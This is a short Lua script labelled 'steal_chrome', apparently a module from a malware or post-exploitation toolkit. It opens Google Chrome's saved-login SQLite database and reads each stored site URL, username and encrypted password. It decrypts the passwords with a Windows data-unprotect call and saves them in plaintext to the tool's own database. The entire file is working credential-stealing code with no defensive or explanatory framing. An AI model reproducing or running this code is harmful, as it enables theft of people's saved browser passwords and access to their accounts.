--steal_chrome
local CSIDL_LOCAL_APPDATA = 0x001c

local chrome_passwords = windows.getfolder(CSIDL_LOCAL_APPDATA) .. "\\Google\\Chrome\\User Data\\Default\\Login Data"

local db = sqlite3.open(chrome_passwords)
action, username, password = sqlite3.gettable(db, "SELECT action_url, username_value, hex(password_value) FROM logins WHERE blacklisted_by_user = 0")
sqlite3.close(db)

local formated = ""

if password ~= nil then
	for i,v in pairs(password) do
		formated = formated .. action[i] .. ";" .. username[i] .. ";" .. windows.cryptunprotecthexdata(v)
	end
	database.add(50, 3, formated)
end
